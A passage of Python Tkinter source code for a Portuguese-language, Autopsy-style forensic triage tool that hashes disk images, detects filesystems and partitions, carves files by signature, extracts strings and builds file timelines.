        self.hex_text = scrolledtext.ScrolledText(self.tab_hex, font=("Consolas", 9), bg="#0a0a0a", fg="#00ff88", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="none")
        self.hex_text.pack(fill="both", expand=True, padx=6, pady=6)
        self.hex_text.insert("1.0", "Hex Viewer - selecione ficheiro na aba FILESYSTEM ou insira offset da imagem.\nMostra dump hexadecimal tipo Autopsy/HxD.")
        
        search_top = tk.Frame(self.tab_search, bg=BG)
        search_top.pack(fill="x", padx=6, pady=6)
        tk.Label(search_top, text="KEYWORD:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.keyword_entry = tk.Entry(search_top, font=(FONT_MONO, 10), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=28)
        self.keyword_entry.pack(side="left", padx=8, ipady=4)
        self.keyword_entry.bind("<Return>", lambda e: self.keyword_search())
        b_search = tk.Button(search_top, text="🔍 PROCURAR", command=self.keyword_search, bg="#0a1f15", fg="#00ff88", font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=12, pady=4, cursor="hand2")
        b_search.pack(side="left", padx=4)
        tk.Label(search_top, text="Dica: procura em nomes, paths, strings, IPs, emails", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(side="left", padx=10)
        
        search_frame = tk.Frame(self.tab_search, bg=PANEL_BG)
        search_frame.pack(fill="both", expand=True, padx=6, pady=4)
        self.search_tree = ttk.Treeview(search_frame, columns=("Onde", "Match", "Offset/Caminho", "Contexto"), show="headings", height=18)
        for c,w in zip(("Onde", "Match", "Offset/Caminho", "Contexto"), [100, 150, 250, 400]):
            self.search_tree.heading(c, text=c)
            self.search_tree.column(c, width=w)
        self.search_tree.pack(side="left", fill="both", expand=True, padx=2, pady=2)
        vsb_search = ttk.Scrollbar(search_frame, orient="vertical", command=self.search_tree.yview)
        vsb_search.pack(side="right", fill="y")
        self.search_tree.configure(yscrollcommand=vsb_search.set)
        
        btns = tk.Frame(self, bg=BG)
        btns.pack(fill="x", padx=10, pady=(0,10))
        for txt, cmd in [
            ("🧹 LIMPAR", self.clear_all), 
            ("💾 EXPORTAR TXT", self.export_txt), 
            ("📊 EXPORTAR JSON", self.export_json),
            ("📋 EXPORTAR CSV", self.export_csv),
            ("📂 EXTRAIR FICHEIRO", self.extract_selected_file),
            ("📋 COPIAR SEL.", self.copy_selected)
        ]:
            b = tk.Button(btns, text=txt, command=cmd)
            b.pack(side="left", padx=3, ipady=5, fill="x", expand=True)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))
        
        self.last_report = ""
    
    def select_image(self):
        path = filedialog.askopenfilename(
            title="Selecionar imagem de disco/evidência",
            filetypes=[
                ("Imagens Forenses", "*.raw *.dd *.img *.E01 *.vmdk *.vhd *.iso *.bin *.dmp *.001"),
                ("Todos", "*.*")
            ]
        )
        if not path:
            return
        self.file_path = path
        self.is_folder = False
        self.file_size = os.path.getsize(path)
        self.path_var.set(os.path.basename(path))
        self.stats_label.configure(text=f"Imagem: {os.path.basename(path)} | {self.file_size/1024/1024:.2f} MB | Calculando hashes...")
        threading.Thread(target=self.calc_hashes_thread, daemon=True).start()
    
    def select_folder(self):
        path = filedialog.askdirectory(title="Selecionar pasta/mount point para análise")
        if not path:
            return
        self.file_path = path
        self.is_folder = True
        self.file_size = 0
        try:
            total = 0
            count = 0
            for dirpath, dirnames, filenames in os.walk(path):
                for f in filenames:
                    fp = os.path.join(dirpath, f)
                    try:
                        total += os.path.getsize(fp)
                        count += 1
                        if count > 5000:
                            break
                    except:
                        pass
                if count > 5000:
                    break
            self.file_size = total
        except:
            pass
        self.path_var.set(f"[PASTA] {os.path.basename(path)}")
        self.stats_label.configure(text=f"Pasta: {path} | ~{self.file_size/1024/1024:.1f} MB | {len(os.listdir(path))} itens | Pronto para ANALISAR")
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", f"══ PASTA SELECIONADA ══\nPath: {path}\nItens: {len(os.listdir(path))}\nTamanho aprox: {self.file_size/1024/1024:.2f} MB\n\nClique ANALISAR para iniciar investigação forense tipo Autopsy.")
    
    def calc_hashes_thread(self):
        try:
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            with open(self.file_path, "rb") as f:
                for chunk in iter(lambda: f.read(1024*1024), b""):
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
            self.hashes = {"md5": md5.hexdigest(), "sha1": sha1.hexdigest(), "sha256": sha256.hexdigest()}
            with open(self.file_path, "rb") as f:
                sample = f.read(1024*1024)
                if sample:
                    freq = {}
                    for b in sample:
                        freq[b] = freq.get(b, 0) + 1
                    ent = 0
                    for c in freq.values():
                        p = c / len(sample)
                        if p>0:
                            ent -= p * math.log2(p)
                    self.entropy = ent
                else:
                    self.entropy = 0
            self.after(0, self.update_hashes_ui)
        except Exception as e:
            self.after(0, lambda: self.stats_label.configure(text=f"Erro hash: {e}"))
    
    def update_hashes_ui(self):
        txt = (
            f"══ IMAGEINFO // AUTOPSY ══\n"
            f"Arquivo: {self.file_path}\n"
            f"Tamanho: {self.file_size} bytes ({self.file_size/1024/1024:.2f} MB)\n"
            f"MD5: {self.hashes.get('md5','')}\n"
            f"SHA1: {self.hashes.get('sha1','')}\n"
            f"SHA256: {self.hashes.get('sha256','')}\n"
            f"Entropia: {self.entropy:.4f}/8.0 {'(Alta - possivelmente encriptado/comprimido)' if self.entropy>7.5 else '(Normal)' if self.entropy>4 else '(Baixa)'}\n"
            f"Tipo FS: {self.fs_type} | pytsk3: {'Disponível' if self.tsk_available else 'Fallback'}\n\n"
            f"Clique ANALISAR para começar investigação completa."
        )
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", txt)
        self.stats_label.configure(text=f"Hash OK | Entropia:{self.entropy:.2f} | {self.file_size/1024/1024:.2f} MB | Pronto para ANALISAR")
    
    def check_sleuthkit(self):
        tools = ["mmls", "fls", "fsstat", "istat", "tsk_recover"]
        found = []
        missing = []
        for t in tools:
            p = shutil.which(t)
            if p:
                found.append(f"{t}: {p}")
            else:
                missing.append(t)
        if found:
            msg = "Sleuth Kit encontrado:\n" + "\n".join(found)
            if missing:
                msg += "\n\nEm falta: " + ", ".join(missing)
            msg += "\n\nPara usar: mmls imagem.raw / fls -r -m / imagem.raw"
        else:
            msg = (
                "Sleuth Kit NÃO encontrado.\n\n"
                "Instalar:\n"
                "- Windows: https://www.sleuthkit.org/\n"
                "- Linux: sudo apt install sleuthkit\n"
                "- macOS: brew install sleuthkit\n\n"
                "Esta ferramenta funciona sem SleuthKit em modo fallback."
            )
        messagebox.showinfo("Sleuth Kit Check", msg)
    
    def launch_external_autopsy(self):
        autopsy_paths = [
            "autopsy", "autopsy64.exe", "autopsy.exe",
            "C:\\Program Files\\Autopsy\\bin\\autopsy64.exe",
            "/usr/bin/autopsy", "/opt/autopsy/bin/autopsy"
        ]
        found = None
        for p in autopsy_paths:
            if shutil.which(p) or os.path.exists(p):
                found = shutil.which(p) or p
                break
        if found:
            try:
                subprocess.Popen([found], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                messagebox.showinfo("Autopsy", f"Autopsy lançado: {found}\nDepois: Create New Case -> Add Data Source -> {self.file_path or ''}")
            except Exception as e:
                messagebox.showwarning("Autopsy", f"Erro ao lançar {found}: {e}")
        else:
            msg = (
                "Autopsy externo NÃO encontrado.\n\n"
                "Download: https://www.sleuthkit.org/autopsy/\n"
                "Esta ferramenta OSINIT é alternativa leve integrada.\n\n"
                "Instale Autopsy para casos grandes; use OSINIT para triagem rápida."
            )
            if messagebox.askyesno("Autopsy Externo", msg + "\n\nAbrir site do Autopsy?"):
                webbrowser.open("https://www.sleuthkit.org/autopsy/")
    
    def start_analysis(self):
        if not self.file_path or not os.path.exists(self.file_path):
            messagebox.showwarning("Aviso", "Selecione imagem ou pasta primeiro.")
            return
        if self.is_analyzing:
            return
        self.is_analyzing = True
        self.btn_analyze.configure(text="⏳ ANALISANDO...", state="disabled")
        for tree in [self.files_tree, self.timeline_tree, self.deleted_tree, self.carving_tree, self.str_tree, self.hash_tree, self.search_tree]:
            try:
                tree.delete(*tree.get_children())
            except:
                pass
        self.file_list = []
        self.deleted_list = []
        self.timeline_list = []
        self.carved_files = []
        self.strings_ascii = []
        self.stats_label.configure(text="A analisar... modo Autopsy - pode demorar 10-60s")
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", f"══ A ANALISAR: {self.file_path} ══\nModo: {'PASTA' if self.is_folder else 'IMAGEM'}\nAguarde...\n")
        threading.Thread(target=self.analysis_worker, daemon=True).start()
    
    def analysis_worker(self):
        try:
            self.fs_type = self.detect_fs_type()
            self.os_guess = self.guess_os()
            
            if self.is_folder:
                self.analyze_folder_mode()
            else:
                if self.tsk_available:
                    try:
                        self.analyze_with_pytsk3()
                    except Exception as e:
                        self.after(0, lambda: self.info_text.insert("end", f"\n\npytsk3 falhou ({e}), a usar fallback raw mode...\n"))
                        self.analyze_raw_image_mode()
                else:
                    self.analyze_raw_image_mode()
            
            self.after(0, self.update_ui_after_analysis)
        except Exception as e:
            import traceback
            tb = traceback.format_exc()
            self.after(0, lambda: messagebox.showerror("Erro Análise", f"{e}\n{tb[:800]}"))
            self.after(0, lambda: self.btn_analyze.configure(text="🔍 ANALISAR (Autopsy)", state="normal"))
            self.is_analyzing = False
    
    def detect_fs_type(self):
        if self.is_folder:
            return "HOST FOLDER (live FS)"
        try:
            with open(self.file_path, "rb") as f:
                header = f.read(4096)
                if len(header) < 512:
                    return "Ficheiro pequeno / Desconhecido"
                if header[510:512] == b"\x55\xAA":
                    return "MBR Disk Image (com partições)"
                if b"NTFS    " in header:
                    return "NTFS"
                if b"FAT32" in header or b"MSDOS5.0" in header:
                    return "FAT32"
                if b"FAT16" in header:
                    return "FAT16"
                f.seek(1024)
                superblock = f.read(1024)
                if len(superblock) > 56 and superblock[56:58] == b"\x53\xEF":
                    return "EXT2/EXT3/EXT4"
                if b"exFAT" in header or b"EXFAT" in header:
                    return "exFAT"
                if header.startswith(b"EVF\x09") or b"EnCase" in header[:100]:
                    return "EnCase E01 (requer pyewf/pytsk3)"
                return "RAW / Desconhecido (tentar carving)"
        except Exception as e:
            return f"Erro deteção: {e}"
    
    def guess_os(self):
        try:
            if self.is_folder:
                lower_files = [f.lower() for f in os.listdir(self.file_path)[:100]]
                if any("windows" in f or "program files" in f or "users" in f for f in lower_files):
                    return "Windows (live)"
                if any(f in ["etc", "var", "usr", "bin", "home"] for f in lower_files):
                    return "Linux/Unix (live)"
                return "Desconhecido (pasta)"
            else:
                return "A detetar via strings..."
        except:
            return "Desconhecido"
    
    def analyze_folder_mode(self):
        count = 0
        max_files = 20000
        for root, dirs, files in os.walk(self.file_path):
            if count > max_files:
                break
            for fname in files:
                if count > max_files:
                    break
                fpath = os.path.join(root, fname)
                try:
                    st = os.stat(fpath)
                    rel = os.path.relpath(fpath, self.file_path)
                    ext = os.path.splitext(fname)[1].lower()
                    ftype = self.guess_file_type(fname, ext)
                    is_deleted = self.is_likely_deleted(fpath, fname)
                    info = ""
                    if is_deleted:
                        info = "Possível apagado / temporário"
                    if any(s in fname.lower() for s in self.SUSPICIOUS_NAMES):
                        info += " | SUSPEITO"
                    
                    entry = {
                        "name": fname,
                        "path": rel,
                        "full_path": fpath,
                        "size": st.st_size,
                        "type": ftype,
                        "mtime": st.st_mtime,
                        "atime": st.st_atime,
                        "ctime": st.st_ctime,
                        "ext": ext,
                        "is_deleted": is_deleted,
                        "info": info,
                        "status": "Apagado?" if is_deleted else "Existente"
                    }
                    self.file_list.append(entry)
                    if is_deleted:
                        self.deleted_list.append(entry)
                    self.timeline_list.append((st.st_mtime, "Modified", fname, rel, st.st_size, ftype))
                    self.timeline_list.append((st.st_ctime, "Created", fname, rel, st.st_size, ftype))
                    count += 1
                except:
                    continue
            if len(dirs) > 100:
                dirs[:] = dirs[:100]
        
        self.timeline_list.sort(key=lambda x: x[0], reverse=True)
        self.strings_ascii = []
        for entry in self.file_list[:500]:
            if entry["size"] > 0 and entry["size"] < 5*1024*1024 and entry["ext"] in [".txt", ".log", ".json", ".xml", ".ini", ".conf", ".db", ".sqlite"]:
                try:
                    with open(entry["full_path"], "rb") as f:
                        data = f.read(1024*100)
                        self.extract_strings_from_data(data, entry["path"])
                except:
                    pass
    
    def analyze_with_pytsk3(self):
        import pytsk3
        img = pytsk3.Img_Info(self.file_path)
        fs = None
        try:
            fs = pytsk3.FS_Info(img, offset=0)
        except:
            try:
                vol = pytsk3.Volume_Info(img)
                for part in vol:
                    if part.len > 2048:
                        try:
                            fs = pytsk3.FS_Info(img, offset=part.start*512)
                            if fs:
                                break
                        except:
                            continue
            except:
                pass
        
        if not fs:
            raise Exception("Não foi possível abrir FS com pytsk3")
        
        self.file_list = []
        self.deleted_list = []
        self.timeline_list = []
        
        def walk_dir(directory, path_prefix=""):
            for entry in directory:
                if not hasattr(entry, "info") or not entry.info.name:
                    continue
                name = entry.info.name.name.decode(errors="ignore") if isinstance(entry.info.name.name, bytes) else str(entry.info.name.name)
                if name in [".", ".."]:
                    continue
                full_path = f"{path_prefix}/{name}" if path_prefix else f"/{name}"
                try:
                    is_deleted = False
                    if entry.info.meta:
                        size = entry.info.meta.size
                        mtime = entry.info.meta.mtime
                        atime = entry.info.meta.atime
                        ctime = entry.info.meta.crtime or entry.info.meta.ctime
                        if entry.info.meta.flags & pytsk3.TSK_FS_META_FLAG_UNALLOC:
                            is_deleted = True
                        if entry.info.name.flags & pytsk3.TSK_FS_NAME_FLAG_UNALLOC:
                            is_deleted = True
                    else:
                        size = 0
                        mtime = atime = ctime = 0
                    
                    ftype = "DIR" if entry.info.meta and entry.info.meta.type == pytsk3.TSK_FS_META_TYPE_DIR else self.guess_file_type(name, os.path.splitext(name)[1])
                    
                    ent = {
                        "name": name,
                        "path": full_path,
                        "full_path": full_path,
                        "size": size if 'size' in locals() else 0,
                        "type": ftype,
                        "mtime": mtime if 'mtime' in locals() else 0,
                        "atime": atime if 'atime' in locals() else 0,
                        "ctime": ctime if 'ctime' in locals() else 0,
                        "ext": os.path.splitext(name)[1],
                        "is_deleted": is_deleted,
                        "info": "DELETED" if is_deleted else "",
                        "status": "Apagado" if is_deleted else "Existente",
                    }
                    self.file_list.append(ent)
                    if is_deleted:
                        self.deleted_list.append(ent)
                    if 'mtime' in locals() and mtime:
                        self.timeline_list.append((mtime, "Modified", name, full_path, size, ftype))
                    
                    if ftype == "DIR" and not is_deleted and len(self.file_list) < 20000:
                        try:
                            subdir = entry.as_directory()
                            walk_dir(subdir, full_path)
                        except:
                            pass
                except:
                    continue
        
        root = fs.open_dir(path="/")
        walk_dir(root)
        self.timeline_list.sort(key=lambda x: x[0], reverse=True)
        self.analyze_raw_image_mode(quick=True)
    
    def analyze_raw_image_mode(self, quick=False):
        try:
            max_scan = 500*1024*1024 if not quick else 100*1024*1024
            file_size = os.path.getsize(self.file_path) if not self.is_folder else 0
            scan_size = min(file_size, max_scan) if file_size else max_scan
            
            if not quick:
                self.carve_signatures(scan_size)
            
            self.extract_strings_raw(scan_size)
            
            if not self.file_list and self.carved_files:
                for carved in self.carved_files:
                    ent = {
                        "name": f"carved_{carved['offset']}{carved['ext']}",
                        "path": f"/unalloc/{carved['offset']}",
                        "full_path": f"offset:{carved['offset']}",
                        "size": carved["size_est"],
                        "type": carved["type"],
                        "mtime": 0,
                        "atime": 0,
                        "ctime": 0,
                        "ext": carved["ext"],
                        "is_deleted": True,
                        "info": f"Carved {carved['type']} @ {carved['offset']}",
                        "status": "Carved/Unalloc"
                    }
                    self.file_list.append(ent)
                    self.deleted_list.append(ent)
            
            if not self.file_list and not self.is_folder:
                self.file_list.append({
                    "name": os.path.basename(self.file_path),
                    "path": self.file_path,
                    "full_path": self.file_path,
                    "size": file_size,
                    "type": "Imagem Raw",
                    "mtime": os.path.getmtime(self.file_path),
                    "atime": os.path.getatime(self.file_path),
                    "ctime": os.path.getctime(self.file_path),
                    "ext": os.path.splitext(self.file_path)[1],
                    "is_deleted": False,
                    "info": "Imagem completa - use carving/strings",
                    "status": "Imagem"
                })
        except Exception as e:
            print(f"Raw mode error: {e}")
    
    def carve_signatures(self, max_scan):
        self.carved_files = []
        try:
            sigs = {
                "JPEG": (b"\xFF\xD8\xFF", b"\xFF\xD9", ".jpg"),
                "PNG": (b"\x89PNG", None, ".png"),
                "PDF": (b"%PDF", b"%%EOF", ".pdf"),
                "ZIP": (b"PK\x03\x04", None, ".zip"),
                "GIF87": (b"GIF87a", None, ".gif"),
                "GIF89": (b"GIF89a", None, ".gif"),
                "BMP": (b"BM", None, ".bmp"),
                "SQLite": (b"SQLite format 3", None, ".db"),
                "ELF": (b"\x7FELF", None, ".elf"),
                "MZ_EXE": (b"MZ", None, ".exe"),
            }
            with open(self.file_path, "rb") as f:
                try:
                    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        size = min(len(mm), max_scan)
                        for ftype, (header, footer, ext) in sigs.items():
                            offset = 0
                            count = 0
                            while True:
                                idx = mm.find(header, offset, size)
                                if idx == -1:
                                    break
                                est_size = 1024*100
                                if footer:
                                    end_idx = mm.find(footer, idx+len(header), min(idx+10*1024*1024, size))
                                    if end_idx != -1:
                                        est_size = end_idx - idx + len(footer)
                                est_size = min(est_size, 10*1024*1024)
                                self.carved_files.append({
                                    "offset": idx,
                                    "type": ftype,
                                    "size_est": est_size,
                                    "header": header.hex()[:20],
                                    "footer": footer.hex()[:20] if footer else "N/A",
                                    "ext": ext,
                                    "info": f"Encontrado @ {idx} (0x{idx:X})"
                                })
                                offset = idx + len(header)
                                count += 1
                                if count > 200:
                                    break
                                if len(self.carved_files) > 1000:
                                    break
                            if len(self.carved_files) > 1000:
                                break
                except:
                    data = f.read(max_scan)
                    for ftype, (header, footer, ext) in sigs.items():
                        offset = 0
                        while True:
                            idx = data.find(header, offset)
                            if idx == -1:
                                break
                            self.carved_files.append({
                                "offset": idx,
                                "type": ftype,
                                "size_est": 102400,
                                "header": header.hex()[:20],
                                "footer": footer.hex()[:20] if footer else "N/A",
                                "ext": ext,
                                "info": f"@ {idx}"
                            })
                            offset = idx + 1
                            if len(self.carved_files) > 500:
                                break
        except Exception as e:
            print(f"Carve error {e}")
    
    def extract_strings_raw(self, max_scan):
        try:
            min_len = 5
            max_strings = 20000
            ascii_pat = re.compile(rb'[ -~]{%d,}' % min_len)
            with open(self.file_path, "rb") as f:
                data = f.read(max_scan)
                for m in ascii_pat.finditer(data):
                    s = m.group(0).decode(errors="ignore")
                    if len(s) >= min_len:
                        low = s.lower()
                        ctx = "normal"
                        if any(x in low for x in ["http", "www", ".com", ".pt", ".org"]):
                            ctx = "URL"
                        elif re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", s):
                            ctx = "IP"
                        elif "@" in s and "." in s:
                            ctx = "Email"
                        elif any(k in low for k in self.SUSPICIOUS_NAMES):
                            ctx = "SUSPEITO"
                        elif "password" in low or "pwd" in low:
                            ctx = "Credencial?"
                        self.strings_ascii.append({
                            "offset": m.start(),
                            "type": "ASCII",
                            "size": len(s),
                            "string": s[:200],
                            "context": ctx
                        })
                        if len(self.strings_ascii) > max_strings:
                            break
        except Exception as e:
            print(f"strings error {e}")
    
    def extract_strings_from_data(self, data, path_hint=""):
        try:
            min_len = 4
            ascii_pat = re.compile(rb'[ -~]{%d,}' % min_len)
            for m in ascii_pat.finditer(data):
                s = m.group(0).decode(errors="ignore")
                if len(s) >= min_len:
                    ctx = path_hint or "file"
                    if "http" in s.lower():
                        ctx = "URL"
                    elif "@" in s:
                        ctx = "Email"
                    self.strings_ascii.append({
                        "offset": m.start(),
                        "type": "ASCII",
                        "size": len(s),
                        "string": s[:200],
                        "context": ctx
                    })
                    if len(self.strings_ascii) > 10000:
                        break
        except:
            pass
    
    def guess_file_type(self, fname, ext):
        ext = ext.lower()
        mapping = {
            ".jpg": "Imagem", ".jpeg": "Imagem", ".png": "Imagem", ".gif": "Imagem", ".bmp": "Imagem",
            ".pdf": "Documento", ".docx": "Documento", ".doc": "Documento", ".txt": "Texto", ".log": "Log",
            ".exe": "Executável", ".dll": "Lib", ".sys": "Driver",
            ".db": "Database", ".sqlite": "Database", ".db3": "Database",
            ".zip": "Archive", ".rar": "Archive", ".7z": "Archive",
            ".mp4": "Vídeo", ".avi": "Vídeo", ".mkv": "Vídeo", ".mp3": "Áudio",
            ".json": "JSON", ".xml": "XML", ".html": "Web", ".js": "Script",
        }
        return mapping.get(ext, "Ficheiro")
    
    def is_likely_deleted(self, fpath, fname):
        fname_low = fname.lower()
        if fname_low.startswith("~") or fname_low.startswith(".~"):
            return True
        if "$recycle" in fpath.lower() or "recycler" in fpath.lower() or ".trash" in fpath.lower():
            return True
        if fname_low.endswith(".tmp") or fname_low.endswith(".temp"):
            return True
        return False
    
    def update_ui_after_analysis(self):
        self.is_analyzing = False
        self.btn_analyze.configure(text="🔍 ANALISAR (Autopsy)", state="normal")
        
        info = (
            f"══ AUTOPSY RESULTADOS ══\n"
            f"Arquivo: {self.file_path}\n"
            f"Tipo FS: {self.fs_type}\n"
            f"OS Guess: {self.os_guess}\n"
            f"Tamanho: {self.file_size} bytes ({self.file_size/1024/1024:.2f} MB)\n"
            f"MD5: {self.hashes.get('md5','N/A')}\n"
            f"SHA256: {self.hashes.get('sha256','N/A')}\n"
            f"SHA1: {self.hashes.get('sha1','N/A')}\n"
            f"Entropia: {self.entropy:.3f}/8.0\n"
            f"pytsk3: {'Sim - análise forense real' if self.tsk_available else 'Não - modo fallback'}\n\n"
            f"══ ESTATÍSTICAS ══\n"
            f"Ficheiros listados: {len(self.file_list)}\n"
            f"Apagados/Recuperáveis: {len(self.deleted_list)}\n"
            f"Timeline entradas: {len(self.timeline_list)}\n"
            f"Carved (assinaturas): {len(self.carved_files)}\n"
            f"Strings extraídas: {len(self.strings_ascii)}\n\n"
        )
        try:
            if not self.is_folder:
                with open(self.file_path, "rb") as f:
                    f.seek(0)
                    mbr = f.read(512)
                    if len(mbr) == 512 and mbr[510:512] == b"\x55\xAA":
                        info += "MBR detectado (0x55AA)\nPartições:\n"
                        for i in range(4):
                            offset = 446 + i*16
                            part = mbr[offset:offset+16]
                            if len(part) == 16:
                                status = part[0]
                                ptype = part[4]
                                lba_start = struct.unpack('<I', part[8:12])[0]
                                sectors = struct.unpack('<I', part[12:16])[0]
                                if ptype != 0:
                                    info += f"  Part {i+1}: Tipo 0x{ptype:02X} Start LBA {lba_start} Sectors {sectors} ({sectors*512/1024/1024:.1f} MB) {'Boot' if status==0x80 else ''}\n"
                    else:
                        info += "Sem MBR válido (pode ser partição direta ou RAW)\n"
        except Exception as e:
            info += f"Erro partição: {e}\n"
        
        info += "\n══ CHAIN OF CUSTODY ══\n"
        info += f"Analisado em: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        info += f"Ferramenta: OSINIT Autopsy-like v1.0\n"
        info += "\nUse EXPORTAR para gerar relatório TXT/JSON/CSV para caso."
        
        self.info_text.delete("1.0", "end")
        self.info_text.insert("1.0", info)
        self.last_report = info
        
        for entry in self.file_list[:5000]:
            mtime_str = datetime.datetime.fromtimestamp(entry["mtime"]).strftime("%Y-%m-%d %H:%M:%S") if entry["mtime"] else "N/A"
            size_str = f"{entry['size']}" if entry["size"] < 1024 else f"{entry['size']/1024:.1f}KB" if entry["size"] < 1024*1024 else f"{entry['size']/1024/1024:.2f}MB"
            self.files_tree.insert("", "end", values=(
                entry["name"][:40],
                entry["path"][:60],
                size_str,
                entry["type"],
                mtime_str,
                entry["status"],
                entry["info"][:40]
            ))
        
        for ts, action, fname, fpath, fsize, ftype in self.timeline_list[:3000]:
            try:
                dt_str = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S") if ts else "N/A"
                size_str = f"{fsize/1024:.1f}KB" if fsize < 1024*1024 else f"{fsize/1024/1024:.1f}MB"
                self.timeline_tree.insert("", "end", values=(dt_str, action, fname[:30], fpath[:50], size_str, ftype))
            except:
                continue
        
        for entry in self.deleted_list[:2000]:
            size_str = f"{entry['size']}"
            motivo = "Unallocated" if entry["is_deleted"] else entry["info"]
            if "recycle" in entry["path"].lower():
                motivo = "$Recycle.Bin"
            elif "carved" in entry["status"].lower():
                motivo = "Carved from unalloc"
            rec = "Sim" if entry["size"]>0 else "Parcial"
            self.deleted_tree.insert("", "end", values=(
                entry["name"][:30],
                entry["path"][:50],
                size_str,
                entry["status"],
                motivo[:30],
                rec
            ))
        
        for carved in self.carved_files[:1000]:
            self.carving_tree.insert("", "end", values=(
                f"{carved['offset']} (0x{carved['offset']:X})",
                carved["type"],
                carved["size_est"],
                carved["header"],
                carved["footer"],
                carved["ext"],
                carved["info"][:40]
            ))
        self.carv_label.configure(text=f"{len(self.carved_files)} ficheiros carved por assinatura")
        
        for s in self.strings_ascii[:5000]:
            self.str_tree.insert("", "end", values=(
                f"{s['offset']} (0x{s['offset']:X})",
                s["type"],
                s["size"],
                s["string"][:80],
                s["context"][:30]
            ))
        self.str_count_label.configure(text=f"{len(self.strings_ascii)} strings")
        
        if self.is_folder:
            for entry in self.file_list[:1000]:
                if entry["size"] >0 and entry["size"] < 10*1024*1024:
                    try:
                        md5 = hashlib.md5()
                        sha1 = hashlib.sha1()
                        sha256 = hashlib.sha256()
                        with open(entry["full_path"], "rb") as f:
                            for chunk in iter(lambda: f.read(8192), b""):
                                md5.update(chunk)
                                sha1.update(chunk)
                                sha256.update(chunk)
                        nota = ""
                        if any(k in entry["name"].lower() for k in self.SUSPICIOUS_NAMES):
                            nota = "SUSPEITO"
                        self.hash_tree.insert("", "end", values=(
                            entry["name"][:20],
                            md5.hexdigest()[:24]+"...",
                            sha1.hexdigest()[:24]+"...",
                            sha256.hexdigest()[:24]+"...",
                            entry["size"],
                            nota
                        ))
                    except:
                        pass
        else:
            self.hash_tree.insert("", "end", values=(
                os.path.basename(self.file_path),
                self.hashes.get("md5","")[:32],
                self.hashes.get("sha1","")[:32],
                self.hashes.get("sha256","")[:32],
                self.file_size,
                "Imagem completa"
            ))
        
        self.stats_label.configure(text=f"Análise concluída | {len(self.file_list)} ficheiros | {len(self.deleted_list)} apagados | {len(self.carved_files)} carved | {len(self.strings_ascii)} strings | FS: {self.fs_type}")
    
    def filter_files(self):
        filt = self.files_filter.get().lower()
        ext_filt = self.ext_filter_var.get()
        for item in self.files_tree.get_children():
            self.files_tree.delete(item)
        for entry in self.file_list:
            if filt and filt not in entry["name"].lower() and filt not in entry["path"].lower():
                continue
            if ext_filt != "todas":
                if ext_filt == ".jpg/.png" and entry["ext"] not in [".jpg",".jpeg",".png",".gif",".bmp"]:
                    continue
                if ext_filt == ".pdf/.docx" and entry["ext"] not in [".pdf",".docx",".doc",".txt"]:
                    continue
                if ext_filt == ".exe/.dll" and entry["ext"] not in [".exe",".dll",".sys"]:
                    continue
                if ext_filt == ".db/.sqlite" and entry["ext"] not in [".db",".sqlite",".db3"]:
                    continue
                if ext_filt == ".log/.txt" and entry["ext"] not in [".log",".txt",".json",".xml"]:
                    continue
                if ext_filt == "suspeitos" and "suspeito" not in entry["info"].lower() and not any(k in entry["name"].lower() for k in self.SUSPICIOUS_NAMES):
                    continue
            mtime_str = datetime.datetime.fromtimestamp(entry["mtime"]).strftime("%Y-%m-%d %H:%M:%S") if entry["mtime"] else "N/A"
            size_str = f"{entry['size']}"
            self.files_tree.insert("", "end", values=(entry["name"][:40], entry["path"][:60], size_str, entry["type"], mtime_str, entry["status"], entry["info"][:40]))
    
    def filter_strings(self):
        filt = self.str_filter.get().lower()
        for item in self.str_tree.get_children():
            self.str_tree.delete(item)
        count = 0
        for s in self.strings_ascii:
            if filt and filt not in s["string"].lower() and filt not in s["context"].lower():
                continue
            self.str_tree.insert("", "end", values=(f"{s['offset']} (0x{s['offset']:X})", s["type"], s["size"], s["string"][:80], s["context"][:30]))
            count += 1
            if count > 3000:
                break
        self.str_count_label.configure(text=f"{count} strings (filtrado)")
    
    def keyword_search(self):
        kw = self.keyword_entry.get().strip()
        if not kw:
            messagebox.showwarning("Aviso", "Insira keyword para procurar.")
            return
        kw_low = kw.lower()
        for item in self.search_tree.get_children():
            self.search_tree.delete(item)
        found = 0
        for entry in self.file_list:
            if kw_low in entry["name"].lower() or kw_low in entry["path"].lower():
                self.search_tree.insert("", "end", values=("FILESYSTEM", kw, entry["path"], f"{entry['type']} | {entry['size']} bytes"))
                found += 1
        for s in self.strings_ascii:
            if kw_low in s["string"].lower():
                self.search_tree.insert("", "end", values=(f"STRINGS ({s['context']})", kw, f"Offset {s['offset']}", s["string"][:80]))
                found += 1
                if found > 1000:
                    break
        for carved in self.carved_files:
            if kw_low in carved["type"].lower():
                self.search_tree.insert("", "end", values=("CARVING", kw, f"Offset {carved['offset']}", carved["info"]))
                found += 1
        self.stats_label.configure(text=f"Keyword '{kw}' | {found} resultados")
        if found == 0:
            self.search_tree.insert("", "end", values=("Nenhum", kw, "-", "Tente outro termo, ex: .jpg, password, http, 192.168"))
    
    def on_file_select(self):
        sel = self.files_tree.selection()
        if not sel:
            return
        vals = self.files_tree.item(sel[0], "values")
        self.hex_offset_entry.delete(0, "end")
        self.hex_offset_entry.insert(0, vals[1][:60])
    
    def on_deleted_select(self):
        sel = self.deleted_tree.selection()
        if not sel:
            return
        vals = self.deleted_tree.item(sel[0], "values")
        self.info_text.delete("1.0", "end")
